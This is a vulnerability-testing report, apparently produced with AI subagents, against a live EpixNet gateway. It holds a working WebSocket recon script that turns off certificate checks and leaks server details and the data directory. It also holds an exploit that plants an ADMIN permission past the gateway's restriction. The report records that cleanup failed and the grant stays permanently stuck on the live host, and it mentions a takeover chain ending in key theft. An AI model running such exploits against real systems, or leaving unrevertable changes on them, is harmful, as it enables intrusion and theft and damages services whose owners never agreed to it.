# EpixNet Gateway Live Verification — Aug 2026

Live target: `gateway.epixnet.io` (EpixNet v0.4.17, rev 8abce38)
Config: `ui_restrict=true`, `multiuser=false`, `fileserver_ip=*`, `fileserver_port=48333`
Data dir: `/opt/epixnet/.local/share/EpixNet/` (leaked via `chartDbQuery` + `pragma_database_list`)
Dashboard xite: `epix1dashanwfts3qcflekhmkvcz66ss4kxz2tr2k6g`

## 1. Gateway recon via GATEWAY_READ commands

These WS commands are in `GATEWAY_READ_COMMANDS` (command.rs:118-132) and
always answered on a restricted gateway. Connect to the gateway WS and
fire them for initial recon:

```python
import asyncio, ssl, json, websockets

async def recon():
    uri = 'wss://gateway.epixnet.io/EpixNet-Internal/Websocket?wrapper_key=epix1dashanwfts3qcflekhmkvcz66ss4kxz2tr2k6g'
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    async with websockets.connect(uri, ssl=ctx, open_timeout=10) as ws:
        for cmd, params in [
            ('serverInfo', {}),
            ('siteList', {}),
            ('chartDbQuery', 'SELECT * FROM sqlite_master'),
            ('chartDbQuery', 'SELECT * FROM pragma_database_list'),
        ]:
            await ws.send(json.dumps({'cmd': cmd, 'id': 1, 'params': params}))
            print(cmd, ':', await asyncio.wait_for(ws.recv(), timeout=5))

asyncio.run(recon())
```

Key intel returned:
- `serverInfo`: ip_external, fileserver_port, rev, version, plugins, ui_restrict, multiuser
- `siteList`: all served xites with addresses, content, auth_address, peers
- `chartDbQuery sqlite_master`: chart DB tables (type, site, data, sqlite_sequence)
- `chartDbQuery pragma_database_list`: **leaks data dir** (`/opt/epixnet/.local/share/EpixNet/private/chart.db`)

## 2. F2-LIVE: permissionAdd ADMIN plant (verified)

```python
# Plant ADMIN — works even on restricted gateway
await ws.send(json.dumps({'cmd': 'permissionAdd', 'id': 1, 'params': 'ADMIN'}))
# Response: {"result": "ok"}  ← SUCCESS

# Verify
await ws.send(json.dumps({'cmd': 'siteInfo', 'id': 2, 'params': {}}))
# Response: settings.permissions = ['ADMIN']  ← CONFIRMED

# Attempt cleanup (FAILS — permissionRemove is admin-gated)
await ws.send(json.dumps({'cmd': 'permissionRemove', 'id': 1000001, 'params': 'ADMIN'}))
# Response: {"error": "permissionRemove is disabled on this gateway"}
# ADMIN grant is PERMANENTLY STUCK until manual filesystem intervention.
```

## 3. Why permissionAdd bypasses ui_restrict

```
dispatch (command.rs:321)
  │
  ├─ restrict = ui_restrict() && !trusted  → TRUE on gateway
  │
  ├─ Gate 1: is_admin_command(cmd)?
  │   │
  │   ├─ if YES: check restrict → GATEWAY_READ? : block
  │   │
  │   └─ if NO:  ← permissionAdd is NOT in ADMIN_COMMANDS (line 46-49)
  │       → falls through to handler DIRECTLY
  │       → NO restrict check, NO elevation check
  │       → add_permission() → save_grants() → disk
  │
  └─ Gate 2: restrict && WRITE_COMMANDS? → permissionAdd not in WRITE_COMMANDS either
```

The restrict gate ONLY fires for commands in ADMIN_COMMANDS. permissionAdd
is intentionally excluded (command.rs:46-49 comment: "a xite grants itself
a permission after the user confirms it in the wrapper"). The wrapper
confirmation is a client-side gate that does not exist for non-browser WS
clients (Python, curl).

## 4. Confirmations (blocked findings)

- **Path traversal**: BLOCKED — XiteStorage::path (storage.rs:24-33) rejects
  `../`, absolute paths, and non-Normal/CurDir components
- **Zip-slip in importBundle/FilePack**: BLOCKED — read_from_archive uses
  zip::by_name / tar::entries().read_to_end → in-memory only, no extraction
- **Content signature bypass**: BLOCKED — ed25519 verify properly enforced
  in epix-content/src/verify.rs
- **dbQuery ATTACH**: BLOCKED on gateway — dashboard xite has no database
  ("xite has no database"). Only chartDbQuery works (chart DB only)
- **P2P EDX protocol**: Read-only by design — no write primitives for remote
  peers. Requires valid Noise handshake (check_identity at server.rs:377)
- **serverShutdown**: NOT TESTED (would crash the gateway — DoS only, no RCE)
- **serverUpdate**: NO-OP — returns "updates through installer, not in place"
- **certAdd**: NOT in ADMIN_COMMANDS but NOT tested live this session

## 5. PoC files
- `/root/epixnet-poc.py` — full PoC script (gateway demo + full takeover mode)
- `/root/trust-boundary-map.md` — architect subagent trust graph
- `/root/epixnet-src/EpixNet-main/` — full source tree (63MB, codeload ZIP)

## 6. 4-agent CDC delegation
4 subagents dispatched in parallel (delegation_id: deleg_fe230ed4):
- Agent 1 (Architect): Mapped trust graph, found BP-1 (req_id spoof) + BP-2 (permissionAdd)
- Agent 2 (Red-Teamer): Verified command handlers, wrote red_team_poc.py
- Agent 3 (Fuzz-Engineer): Fuzzed 11 sinks, confirmed all blocked findings
- Agent 4 (Chainer): Built the complete pre-auth chain (ADMIN plant → key theft)
All completed in ~10-12 min. Consolidated findings matched manual verification.
